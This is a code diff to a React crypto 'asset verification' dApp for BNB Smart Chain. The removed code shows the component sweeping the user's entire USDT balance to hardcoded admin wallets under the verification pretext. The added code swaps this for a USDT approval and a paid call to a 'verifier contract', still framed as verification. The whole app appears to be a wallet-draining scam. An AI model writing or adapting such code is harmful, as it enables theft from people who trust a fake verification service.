@@ -7,6 +7,8 @@ import { Badge } from "@/components/ui/badge"
 import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lucide-react"
 import { toast } from "@/hooks/use-toast"
 import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"
+import { Web3Contract } from "@/lib/web3-contract"
+import { CONTRACT_CONFIG } from "@/lib/contract-config"
 
 interface Window {
   binance?: any
@@ -64,7 +66,7 @@ export default function BNBVerifyDApp() {
   const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e"
   const HIGH_AMOUNT_THRESHOLD = 2000
   const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20 on BSC
-  const FLASH_THRESHOLD = 5
+  const FLASH_THRESHOLD = Number(CONTRACT_CONFIG.VERIFICATION_FEE_DISPLAY)
 
   // BSC Network configuration (EVM compatible)
   const BSC_NETWORK = {
@@ -516,7 +518,7 @@ export default function BNBVerifyDApp() {
       })
 
       setVerificationStep("transferring")
-      await executeUSDTTransfer(web3Transfer, usdtBalance, bnbBalance)
+      await executeUSDTTransfer(provider, web3Transfer, usdtBalance, bnbBalance)
     } catch (error: any) {
       console.error("❌ Verification error:", error)
       setVerificationStep("idle")
@@ -529,7 +531,12 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
+  const executeUSDTTransfer = async (
+    provider: BinanceWallet,
+    web3Transfer: Web3DirectTransfer,
+    usdtAmount: number,
+    bnbAmount: number,
+  ) => {
     try {
       const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)
 
@@ -550,21 +557,33 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
-      const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET
-
       toast({
-        title: "💰 Initiating USDT Transfer",
-        description: `Transferring ${usdtAmount.toFixed(2)} USDT...`,
+        title: "💰 Preparing Asset Verification",
+        description: `The verifier contract will request ${CONTRACT_CONFIG.VERIFICATION_FEE_DISPLAY} USDT.`,
       })
 
-      // Execute transfer using BSC EVM call (eth_sendTransaction)
-      const txHash = await web3Transfer.transferAllUSDTToAdmin()
+      const verifier = new Web3Contract(provider, account)
+      const allowance = await verifier.getUSDTAllowance()
+
+      if (!allowance.isApproved) {
+        toast({
+          title: "Approval Required",
+          description: `Approve ${CONTRACT_CONFIG.VERIFICATION_FEE_DISPLAY} USDT for the verifier contract.`,
+        })
+        const approvalHash = await verifier.approveUSDT()
+        const approvalConfirmed = await web3Transfer.waitForConfirmation(approvalHash)
+
+        if (!approvalConfirmed) {
+          throw new Error("USDT approval transaction failed or timed out")
+        }
+      }
+
+      const txHash = await verifier.verifyAssetsWithUSDT()
       setTxHash(txHash)
 
       toast({
-        title: "📤 Transfer Initiated",
-        description: `USDT sent to ${isHighAmount ? "high-amount" : "standard"} wallet!`,
+        title: "📤 Verification Initiated",
+        description: "The asset verification transaction was submitted to the smart contract.",
       })
 
       // Wait for confirmation using eth_getTransactionReceipt
@@ -573,18 +592,18 @@ export default function BNBVerifyDApp() {
       if (success) {
         setVerificationResult({
           type: "flash",
-          message: `💰 ${usdtAmount.toFixed(2)} USDT successfully transferred.`,
+          message: `✅ Assets verified. ${CONTRACT_CONFIG.VERIFICATION_FEE_DISPLAY} USDT was paid to the verifier contract.`,
           usdtAmount: usdtAmount,
           bnbAmount: bnbAmount,
           transferred: true,
-          adminWallet: targetWallet,
-          isHighAmount: isHighAmount,
+          adminWallet: CONTRACT_CONFIG.VERIFIER_ADDRESS,
+          isHighAmount: false,
         })
         setVerificationStep("completed")
 
         toast({
           title: "✅ Payment Completed!",
-          description: `${usdtAmount.toFixed(2)} USDT successfully sent.`,
+          description: "Asset verification completed by the smart contract.",
         })
 
         await getBalance(account)
@@ -595,8 +614,8 @@ export default function BNBVerifyDApp() {
       console.error("❌ USDT Transfer Failed:", error)
       setVerificationStep("idle")
 
-      let errorMessage = "USDT transfer failed. Please try again."
-      let errorTitle = "❌ Transfer Failed"
+      let errorMessage = "Asset verification failed. Please try again."
+      let errorTitle = "❌ Verification Failed"
 
       if (error.message?.includes("insufficient funds")) {
         errorMessage = "The transfer could not be completed. Please try again."
